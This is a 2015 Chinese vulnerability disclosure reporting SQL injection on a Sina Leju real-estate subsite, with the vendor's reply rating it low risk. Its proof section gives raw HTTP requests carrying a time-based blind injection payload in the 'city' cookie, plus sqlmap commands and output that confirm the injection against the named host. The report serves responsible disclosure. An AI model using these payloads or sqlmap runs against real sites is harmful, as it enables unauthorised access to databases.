wybug_title: 新浪乐居房产又一分站存在SQL注入
wybug_detail:
漏洞详情 披露状态：   									2015-01-14：	细节已通知厂商并且等待厂商处理中									2015-01-14：	厂商已经确认，细节仅向厂商公开									2015-01-24：	细节向核心白帽子及相关领域专家公开									2015-02-03：	细节向普通白帽子公开									2015-02-13：	细节向实习白帽子公开									2015-02-28：	细节向公众公开  简要描述： 新浪乐居房产又一分站存在SQL注入 详细说明：  
用户名长度为21
   漏洞证明：  
GET /index.php HTTP/1.1Cookie: city=aaa'XOR(if(length(user())=22,sleep(3),0))OR'bbb; randcode=21a46beab55e8917960240648176e858X-Requested-With: XMLHttpRequestReferer: http://i.leju.com/Host: i.leju.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*Content-Length: 4
TimeBase手工测下，用户名长度为21用SQLMAP跑的话
GET /index.php HTTP/1.1Cookie: city=*; randcode=21a46beab55e8917960240648176e858X-Requested-With: XMLHttpRequestReferer: http://i.leju.com/Host: i.leju.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*

╰─➤  sqlmap -r 1.txt --dbms=MySQL --risk=3 --level=5 --current-user         _ ___ ___| |_____ ___ ___  {1.0-dev-2985050}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Do you want to process it? [Y/n/q][14:59:17] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly[14:59:17] [WARNING] provided value for parameter 'city' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[14:59:17] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: Cookie #1* ((custom) HEADER)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: city='||(SELECT 'LjDt' FROM DUAL WHERE 7302=7302 AND SLEEP(5))||'; randcode=21a46beab55e8917960240648176e858---[14:59:17] [INFO] testing MySQL

wybug_reply: 漏洞回应  厂商回应： 危害等级：低 漏洞Rank：4  确认时间：2015-01-14 16:06 厂商回复： 感谢关注新浪安全，此为合作方网站漏洞，将通知对方修复。 最新状态： 暂无
